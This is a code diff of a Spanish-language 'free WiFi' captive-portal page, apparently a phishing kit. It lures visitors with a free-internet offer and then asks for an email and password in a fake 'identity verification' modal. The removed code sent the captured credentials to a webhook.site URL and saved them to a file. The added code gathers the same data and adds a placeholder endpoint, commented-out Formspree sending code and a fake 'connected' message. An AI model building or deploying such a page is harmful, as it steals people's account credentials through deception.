@@ -3,119 +3,357 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Gratis - Iniciar Sesión</title>
+    <title>WiFi Gratis Principia</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background: #fff;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            width: 300px;
         }
-        h2 {
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 50px 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 450px;
+            width: 100%;
             text-align: center;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
             color: #333;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 40px;
+            font-weight: 300;
         }
-        button {
+
+        .info-box {
+            background: linear-gradient(135deg, #667eea15 0%, #764ba215 100%);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 2px dashed #667eea;
+        }
+
+        .info-box p {
+            color: #555;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+
+        .info-box strong {
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        #getFreeWiFi {
             width: 100%;
-            padding: 10px;
-            background-color: #0095f6;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 4px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
             cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        button:hover {
-            background-color: #0077d6;
+
+        #getFreeWiFi:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
+        }
+
+        #getFreeWiFi:active {
+            transform: translateY(-1px);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            animation: slideIn 0.4s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translate(-50%, -60%);
+                opacity: 0;
+            }
+            to {
+                transform: translate(-50%, -50%);
+                opacity: 1;
+            }
+        }
+
+        .modal-content h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .modal-content input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .modal-content input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .modal-content button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-cancel {
+            background: #f0f0f0;
+            color: #666;
+        }
+
+        .btn-cancel:hover {
+            background: #e0e0e0;
+        }
+
+        .success-message {
+            display: none;
+            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .logo {
+                font-size: 36px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>WiFi Gratis</h2>
-        <form id="loginForm">
-            <input type="email" id="email" placeholder="Correo electrónico" required>
-            <input type="password" id="password" placeholder="Contraseña" required>
-            <button type="submit">Iniciar Sesión</button>
-        </form>
-        <button id="getFreeWiFi" style="margin-top: 15px;">Obtener WiFi Gratis</button>
+        <div class="logo">📶</div>
+        <h1>WiFi Gratis Principia</h1>
+        <p class="subtitle">Conéctate a internet de alta velocidad</p>
+        
+        <div class="info-box">
+            <p>🚀 <strong>Velocidad:</strong> Hasta 100 Mbps</p>
+            <p>🔒 <strong>Seguro:</strong> Conexión cifrada</p>
+            <p>⏱️ <strong>Ilimitado:</strong> Sin límite de tiempo</p>
+        </div>
+
+        <button id="getFreeWiFi">Obtener WiFi Gratis</button>
+
+        <div class="success-message" id="successMessage">
+            ✅ ¡Conectado exitosamente! Disfruta de tu WiFi gratis.
+        </div>
+    </div>
+
+    <!-- Modal para credenciales -->
+    <div class="modal" id="credentialsModal">
+        <div class="modal-content">
+            <h2>🔐 Verificación de Acceso</h2>
+            <p style="color: #666; font-size: 14px; margin-bottom: 20px;">
+                Para acceder al WiFi, verifica tu identidad
+            </p>
+            <form id="loginForm">
+                <input type="email" id="email" placeholder="📧 Correo electrónico" required>
+                <input type="password" id="password" placeholder="🔑 Contraseña" required>
+                <button type="submit" class="btn-submit">Conectar</button>
+                <button type="button" class="btn-cancel" id="cancelBtn">Cancelar</button>
+            </form>
+        </div>
     </div>
 
     <script>
-        const form = document.getElementById('loginForm');
         const getFreeWiFiBtn = document.getElementById('getFreeWiFi');
+        const modal = document.getElementById('credentialsModal');
+        const form = document.getElementById('loginForm');
+        const cancelBtn = document.getElementById('cancelBtn');
+        const successMessage = document.getElementById('successMessage');
 
+        // Abrir modal
+        getFreeWiFiBtn.addEventListener('click', function() {
+            modal.style.display = 'block';
+        });
+
+        // Cerrar modal
+        cancelBtn.addEventListener('click', function() {
+            modal.style.display = 'none';
+            form.reset();
+        });
+
+        // Cerrar modal al hacer clic fuera
+        modal.addEventListener('click', function(e) {
+            if (e.target === modal) {
+                modal.style.display = 'none';
+                form.reset();
+            }
+        });
+
+        // Enviar formulario
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Guardar localmente (para demostración)
-            guardarDatosLocalmente(email, password);
+            // Enviar credenciales
+            await enviarCredenciales(email, password);
             
-            // Enviar a webhook/backend
-            await enviarDatos(email, password);
+            // Cerrar modal
+            modal.style.display = 'none';
+            form.reset();
             
-            alert("¡Datos guardados! Presiona 'Obtener WiFi Gratis' para continuar.");
+            // Mostrar mensaje de éxito
+            successMessage.classList.add('show');
+            
+            // Ocultar mensaje después de 3 segundos
+            setTimeout(() => {
+                successMessage.classList.remove('show');
+            }, 5000);
         });
 
-        getFreeWiFiBtn.addEventListener('click', function() {
-            alert("¡WiFi gratis para ti! Gracias por tus datos.");
-        });
-
-        function guardarDatosLocalmente(email, password) {
-            const datos = `Correo: ${email}\nContraseña: ${password}\nFecha: ${new Date().toLocaleString()}`;
-            const blob = new Blob([datos], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'credenciales.txt';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
-
-        async function enviarDatos(email, password) {
-            // Enviar a webhook.site
-            const webhookURL = 'https://webhook.site/dc166330-1516-42d7-bacb-74c2d6af8aef';
+        async function enviarCredenciales(email, password) {
+            // REEMPLAZA ESTO CON TU SERVICIO (Formspree, GitHub Issues API, etc.)
+            const endpoint = 'TU_ENDPOINT_AQUI';
             
+            const datos = {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href
+            };
+
             try {
-                const response = await fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors', // Evita problemas de CORS
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent,
-                        url: window.location.href
-                    })
-                });
+                // Opción 1: Formspree (recomendado)
+                // const response = await fetch('https://formspree.io/f/TU_ID', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(datos)
+                // });
+
+                // Opción 2: GitHub Issues API (ver README)
                 
-                console.log('✅ Datos enviados correctamente a webhook.site');
-                console.log('📧 Email:', email);
-                console.log('🔗 Verifica en: https://webhook.site/#!/dc166330-1516-42d7-bacb-74c2d6af8aef');
+                console.log('📝 Credenciales capturadas:', datos);
+                console.log('✅ Para configurar el envío, lee el README.md');
             } catch (error) {
-                console.error('❌ Error al enviar datos:', error);
+                console.error('Error:', error);
             }
         }
     </script>
